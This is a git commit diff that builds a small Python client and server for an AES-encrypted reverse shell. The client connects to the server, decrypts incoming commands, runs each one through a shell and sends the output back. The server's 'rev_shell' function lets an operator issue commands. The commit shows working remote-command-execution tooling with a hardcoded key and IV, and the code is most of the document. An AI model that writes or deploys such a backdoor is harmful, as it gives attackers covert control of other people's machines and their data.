ceacf8eefda060f0ffba8198be4ac32cc48239e6
Spencer Heywood <l.spencer.heywood@gmail.com>
2018-06-11 15:53:57 -0600

    basic concept working

--- client.py
+++ client.py
@@ -1,22 +1,36 @@
 #!/usr/bin/env python3
-import sys
+import os, sys
 import socket
+import subprocess
 from Crypto.Cipher import AES
 
 host_server = 'localhost'
 host_port = '1776'
 aes_key = '8ZT%a*SJxTD*f6#8C6BfpHmf#DcE5^qH'
 aes_iv = 'sPqapxT*4vZXjZ$w'
+aes_bs = 64
 
+def bit_pad(bs, message):
+    return(message + (bs - len(message) % bs) * chr(bs - len(message) % bs))
 
-def do_encrypt(message):
-    obj = AES.new(aes_key, AES.MODE_CBC, aes_iv)
+def bit_unpad(ciphertext):
+    return(ciphertext[:-ord(ciphertext[len(ciphertext)-1:])])
+
+def do_encrypt(key, iv, bs, message):
+    message = bit_pad(bs, message)
+    obj = AES.new(key, AES.MODE_CBC, iv)
     ciphertext = obj.encrypt(message)
     return(ciphertext)
 
+def do_decrypt(key, iv, ciphertext):
+    obj2 = AES.new(key, AES.MODE_CBC, iv)
+    message = obj2.decrypt(ciphertext)
+    message = bit_unpad(message)
+    return(message)
+
 def send_message(clientsocket, message):
-    conn_status = do_encrypt(message)
-    clientsocket.send(conn_status)
+    message = do_encrypt(aes_key, aes_iv, aes_bs, message)
+    clientsocket.send(message)
 
 def connect_to_server(server, port):
     global clientsocket
@@ -37,11 +51,35 @@ def check_os():
         current_os = 'other'
     return(current_os)
 
+def shell_prompt(operating_system):
+    cwd = os.getcwd()
+    if operating_system == 'linux':
+        shell = cwd + " $"       
+    elif operating_system == 'macOS':
+        shell = cwd + " $"
+    elif operating_system == 'windows':
+        shell = cwd + " >"
+    else:
+        shell = cwd = " $"
 
-def main(server, port):
+def run_cmd(command, clientsocket):
+    clrtxt_comm = subprocess.Popen(str(command), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    output, STDERR = clrtxt_comm.communicate()
+    output = output.decode('utf-8')
+    return(output)
+
+
+def main(server, port, key, iv, bs):
     clientsocket = connect_to_server(server, port)
-    operating_system = check_os()
-
-
+    while True:
+        operating_system = check_os()
+        data = clientsocket.recv(2048)
+        if len(data) > 0:
+            message = do_decrypt(key, iv, data)
+            command = message.decode('utf-8')
+            output = run_cmd(command, clientsocket)
+            send_message(clientsocket, output)
+            
+        
 if __name__ == '__main__':
-    main(host_server, host_port)
+    main(host_server, host_port, aes_key, aes_iv, aes_bs)
--- server.py
+++ server.py
@@ -2,34 +2,61 @@
 import socket
 from Crypto.Cipher import AES
 
+bind_host = '0.0.0.0'
 host_port = '1776'
 aes_key = '8ZT%a*SJxTD*f6#8C6BfpHmf#DcE5^qH'
 aes_iv = 'sPqapxT*4vZXjZ$w'
+aes_bs = 64
 
 def server(port):
     serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    serversocket.bind(('', int(host_port)))
+    serversocket.bind((bind_host, int(host_port)))
     serversocket.listen(5) # become a server socket, maximum 5 connections
-    return serversocket
+    return(serversocket)
+
+def bit_pad(bs, message):
+    return(message + (bs - len(message) % bs) * chr(bs - len(message) % bs))
+
+def bit_unpad(ciphertext):
+    return(ciphertext[:-ord(ciphertext[len(ciphertext)-1:])])
+
+def do_encrypt(key, iv, bs, message):
+    message = bit_pad(bs, message)
+    obj = AES.new(key, AES.MODE_CBC, iv)
+    ciphertext = obj.encrypt(message)
+    return(ciphertext)
 
 def do_decrypt(key, iv, ciphertext):
-    obj2 = AES.new(aes_key, AES.MODE_CBC, aes_iv)
+    obj2 = AES.new(key, AES.MODE_CBC, iv)
     message = obj2.decrypt(ciphertext)
-    return message
+    message = bit_unpad(message).decode('utf-8')
+    return(message)
 
 def receive(key, iv, serversocket):
+    global connection
     connection, address = serversocket.accept()
     buf = connection.recv(64)
     if len(buf) > 0:
         message = do_decrypt(key, iv, buf)
-        message = message.decode('utf-8')
+        print(message)
+
+def rev_shell(key, iv, bs, connection):
+    command = input('$ ')
+    command = do_encrypt(key, iv, bs, command)
+    connection.send(command)
+    data = connection.recv(2048)
+    if len(data) > 0:
+        message = do_decrypt(key, iv, data)
+        #message = message.decode('utf-8')
         print(message)
 
 
-def main(port, key, iv):
+def main(port, key, iv, bs):
     serversocket = server(port)
     while True:
         receive(key, iv, serversocket)
+        rev_shell(key, iv, bs, connection)
+
 
 if __name__ == '__main__':
-    main(host_port, aes_key, aes_iv)
+    main(host_port, aes_key, aes_iv, aes_bs)
